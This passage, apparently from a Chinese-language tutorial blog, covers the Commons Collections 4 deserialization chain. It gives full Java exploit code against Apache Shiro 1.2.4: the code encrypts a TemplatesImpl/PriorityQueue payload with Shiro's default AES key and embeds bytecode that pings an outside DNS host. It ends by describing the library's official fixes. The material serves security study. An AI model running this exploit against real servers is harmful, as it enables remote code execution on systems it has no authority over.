        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

成功触发DNS请求，如下-->

![alt text](image-48.png)

改改EXP，给Shiro 1.2.4加个`commons-collections4 4.0`的依赖，打一下Shiro反序列化漏洞，EXP如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class ShiroCommonCollections4 {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl});
        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(new ConstantTransformer(1)));
        priorityQueue.add(clazz);
        priorityQueue.add(clazz);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        objectOutputStream.writeObject(priorityQueue);
        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        objectOutputStream.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

生成Payload如下-->

![alt text](image-240.png)

发包

![alt text](image-241.png)

成功收到回显，如下-->

![alt text](image-48.png)

## CC链官方修复方案

在历史背景中也提及过了，Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀
上同时发布了新的版本，4.1和3.2.2。两个版本描述分别是：This is a security and bugfix release && This is a security and minor release。

1.先看3.2.2版本的修复方案，它增加了⼀个⽅法`FunctorUtils.checkUnsafeSerialization()`，⽤于检测反序列化是否安全。且配置文件默认开启检测，如下-->

![alt text](image-242.png)

这个检查在常⻅的危险Transformer类（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当反序列化包含这些对象时就会抛出异常。

2.再看4.1版本的修复方案，它将这⼏个危险Transformer类不再实现 Serializable 接⼝-->

![alt text](image-243.png)

也就是这几个类再也不能被序列化，更别说在反序列化漏洞中利用了。

至此，CommonsCollections2&CommonsCollections4链完结。随着这两个大版本对应的修复，CC链也基本上完结了。